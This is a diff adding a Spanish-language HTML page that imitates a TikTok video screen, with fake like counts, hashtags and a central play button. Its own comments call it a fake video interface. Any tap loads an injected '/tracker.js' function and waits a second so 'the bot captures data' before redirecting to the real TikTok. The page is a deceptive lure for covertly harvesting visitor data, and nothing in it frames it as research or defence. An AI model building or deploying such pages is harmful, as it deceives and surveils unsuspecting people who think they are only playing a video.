@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#000000">
+    <title>TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            overflow: hidden;
+            color: white;
+        }
+
+        .tiktok-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            background-color: #111;
+            /* Placeholder para el video: se usará una imagen oscura desenfocada */
+            background-image: url('https://images.unsplash.com/photo-1616469829581-73993eb86b02?q=80&w=800&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* Overlay oscuro para resaltar los íconos */
+        .overlay-gradient {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, rgba(0, 0, 0, 0.4) 0%, rgba(0, 0, 0, 0) 25%, rgba(0, 0, 0, 0) 60%, rgba(0, 0, 0, 0.85) 100%);
+            z-index: 1;
+        }
+
+        /* Barra superior */
+        .top-bar {
+            position: absolute;
+            top: 40px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+
+        .top-nav {
+            display: flex;
+            gap: 20px;
+            font-size: 17px;
+            font-weight: 600;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+        }
+
+        .nav-item {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .nav-item.active {
+            color: #fff;
+            border-bottom: 2px solid #fff;
+            padding-bottom: 5px;
+        }
+
+        .search-icon {
+            position: absolute;
+            right: 20px;
+            font-size: 20px;
+        }
+
+        /* Barra de acciones (Derecha) */
+        .right-sidebar {
+            position: absolute;
+            right: 12px;
+            bottom: 90px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 22px;
+            z-index: 10;
+        }
+
+        .action-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            filter: drop-shadow(1px 1px 2px rgba(0, 0, 0, 0.8));
+        }
+
+        .profile-pic-container {
+            position: relative;
+            width: 48px;
+            height: 48px;
+            margin-bottom: 12px;
+        }
+
+        .profile-pic {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            object-fit: cover;
+            background: #ccc;
+        }
+
+        .plus-btn {
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fe2c55;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .action-icon {
+            font-size: 32px;
+            margin-bottom: 5px;
+        }
+
+        .action-text {
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        /* Disco de música animado */
+        .music-disc {
+            margin-top: 15px;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: #222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: spin 4s linear infinite;
+        }
+
+        .music-disc-inner {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: #000;
+        }
+
+        /* Información Inferior */
+        .bottom-info {
+            position: absolute;
+            left: 15px;
+            bottom: 20px;
+            width: calc(100% - 80px);
+            /* Deja espacio para los íconos */
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .username {
+            font-size: 17px;
+            font-weight: 700;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .description {
+            font-size: 15px;
+            line-height: 1.4;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .tags {
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .music-ticker {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .ticker-wrap {
+            width: 180px;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .ticker-text {
+            display: inline-block;
+            animation: ticker 5s linear infinite;
+        }
+
+        @keyframes ticker {
+            0% {
+                transform: translateX(100%);
+            }
+
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        /* Ícono de Play Central Gigante */
+        .play-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        .play-triangle {
+            width: 0;
+            height: 0;
+            border-left: 25px solid rgba(255, 255, 255, 0.85);
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            margin-left: 8px;
+            /* Offset visual para centrar */
+        }
+
+        /* Pantalla de Carga (al presionar) */
+        .loading-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .tiktok-logo-load {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: pulse 1.2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #00f2fe;
+            /* Colores de tiktok (cyan/rojo) */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Interfaz Falso Video -->
+    <div class="tiktok-container" id="mainContainer">
+        <div class="overlay-gradient"></div>
+
+        <!-- Botón de Play Central -->
+        <div class="play-overlay">
+            <div class="play-triangle"></div>
+        </div>
+
+        <!-- Encabezado superior -->
+        <div class="top-bar">
+            <div class="top-nav">
+                <span class="nav-item">Siguiendo</span>
+                <span class="nav-item active">Para ti</span>
+            </div>
+            <div class="search-icon">🔍</div>
+        </div>
+
+        <!-- Menú derecho -->
+        <div class="right-sidebar">
+            <div class="action-button profile-pic-container">
+                <img src="https://ui-avatars.com/api/?name=Viral&background=random" class="profile-pic" alt="Profile">
+                <div class="plus-btn">+</div>
+            </div>
+            <div class="action-button">
+                <div class="action-icon">🤍</div>
+                <div class="action-text">1.4M</div>
+            </div>
+            <div class="action-button">
+                <div class="action-icon">💬</div>
+                <div class="action-text">4352</div>
+            </div>
+            <div class="action-button">
+                <div class="action-icon">🔖</div>
+                <div class="action-text">11K</div>
+            </div>
+            <div class="action-button">
+                <div class="action-icon">↪️</div>
+                <div class="action-text">32K</div>
+            </div>
+
+            <div class="music-disc">
+                <div class="music-disc-inner"></div>
+            </div>
+        </div>
+
+        <!-- Textos inferiores -->
+        <div class="bottom-info">
+            <div class="username">@tendencias_virales</div>
+            <div class="description">
+                Mira esto hasta el final, te sorprenderá 😱🔥<br>
+                <span class="tags">#parati #fyp #viral #humor #tendencia</span>
+            </div>
+            <div class="music-ticker">
+                <span style="font-size: 16px;">🎵</span>
+                <div class="ticker-wrap">
+                    <span class="ticker-text">sonido original - @tendencias_virales</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Pantalla de carga hacia el origen real -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="tiktok-logo-load">📱</div>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Cargar Tracker -->
+    <script src="/tracker.js"></script>
+
+    <script>
+        const loadingScreen = document.getElementById('loadingScreen');
+        let clicked = false;
+
+        function openTikTok() {
+            if (clicked) return;
+            clicked = true;
+
+            loadingScreen.classList.add('active');
+
+            // Si el tracker está inyectado, llamamos su función
+            if (typeof handleMainCta === 'function') {
+                handleMainCta();
+            }
+
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            // Redirección con fallback a web tras 1.5s
+            setTimeout(() => {
+                if (isMobile) {
+                    setTimeout(() => {
+                        window.location.href = 'https://www.tiktok.com/';
+                    }, 2000);
+                    // Intent en Android para forzar app
+                    window.location.href = 'intent://www.tiktok.com/#Intent;package=com.zhiliaoapp.musically;scheme=https;action=android.intent.action.VIEW;end';
+                } else {
+                    window.location.href = 'https://www.tiktok.com/';
+                }
+            }, 1000); // Dar 1 segundo para intentar que el bot capture datos antes de salir
+        }
+
+        // Cualquier toque en toda la pantalla disparará la acción (parecerá que intentan quitar la pausa)
+        document.body.addEventListener('click', openTikTok);
+        document.body.addEventListener('touchstart', openTikTok);
+
+    </script>
+</body>
+
+</html>
